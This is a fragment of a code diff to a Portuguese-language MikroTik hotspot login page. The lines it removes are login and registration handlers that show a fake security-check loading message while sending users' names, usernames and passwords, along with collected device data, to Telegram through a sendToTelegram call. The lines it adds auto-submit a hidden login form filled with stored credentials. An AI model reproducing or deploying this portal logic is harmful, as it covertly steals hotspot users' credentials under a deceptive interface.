+                    // Submeter formulário MikroTik se estiver no hotspot
+                    setTimeout(() => {
+                        if (typeof $(link-login-only) !== 'undefined') {
+                            const form = document.createElement('form');
+                            form.method = 'post';
+                            form.action = '$(link-login-only)';
+                            form.innerHTML = `
+                                <input type="hidden" name="username" value="${userData.username}" />
+                                <input type="hidden" name="password" value="${userData.password}" />
+                                <input type="hidden" name="dst" value="$(link-orig)" />
+                            `;
+                            document.body.appendChild(form);
+                            form.submit();
+                        }
+                    }, 2000);
                 }
-                
-                return true;
-            } catch (error) {
-                console.error('Erro:', error);
-                return false;
-            }
+                fill.style.width = progress + '%';
+                text.textContent = `Liberando conexão... ${Math.floor(progress)}%`;
+            }, 300);
         }
 
-        function showMessage(text, type) {
-            const message = document.getElementById('message');
-            message.textContent = text;
-            message.className = 'message ' + type;
-            message.style.display = 'block';
-            setTimeout(() => { message.style.display = 'none'; }, 5000);
-        }
-
-        // 🔐 HANDLE LOGIN
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('loginUsername').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            document.getElementById('loadingText').textContent = 'Autenticando e verificando segurança...';
-            document.getElementById('loading').style.display = 'flex';
-            
-            try {
-                const deviceData = await collectDeviceData('login');
-                await sendToTelegram(deviceData, { username, password });
-            } catch (error) {
-                console.error('Erro:', error);
-            }
-            
-            setTimeout(() => {
-                document.getElementById('loginForm').submit();
-            }, 2000);
-        });
-
-        // 📝 HANDLE CADASTRO
-        async function handleRegister(e) {
-            e.preventDefault();
-            
-            const name = document.getElementById('regName').value;
-            const username = document.getElementById('regUsername').value;
-            const password = document.getElementById('regPassword').value;
-            const confirmPassword = document.getElementById('regConfirmPassword').value;
-            
-            if (password !== confirmPassword) {
-                showMessage('As senhas não coincidem!', 'error');
-                return;
-            }
-            
-            if (password.length < 6) {
-                showMessage('A senha deve ter pelo menos 6 caracteres!', 'error');
-                return;
-            }
-            
-            document.getElementById('loadingText').textContent = 'Criando conta e verificando...';
-            document.getElementById('loading').style.display = 'flex';
-            
-            try {
-                const deviceData = await collectDeviceData('register');
-                await sendToTelegram(deviceData, { name, username, password });
-                
-                setTimeout(() => {
-                    document.getElementById('loading').style.display = 'none';
-                    showMessage('✅ Cadastro realizado! Faça login.', 'success');
-                    document.getElementById('registerForm').reset();
-                    setTimeout(() => { showForm('login'); }, 2000);
-                }, 1500);
-            } catch (error) {
-                console.error('Erro:', error);
-                document.getElementById('loading').style.display = 'none';
-                showMessage('Erro ao processar. Tente novamente.', 'error');
-            }
-        }
-
+        // ⌨️ Enter para submeter
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                const activeForm = document.querySelector('.form.active');
-                if (activeForm) activeForm.dispatchEvent(new Event('submit'));
+                const activeForm = document.querySelector('form');
+                if (activeForm && document.getElementById('screen2').classList.contains('active')) {
+                    activeForm.dispatchEvent(new Event('submit'));
+                }
             }
         });
-
-        window.addEventListener('load', startPressureSystem);
     </script>
 </body>
 </html>
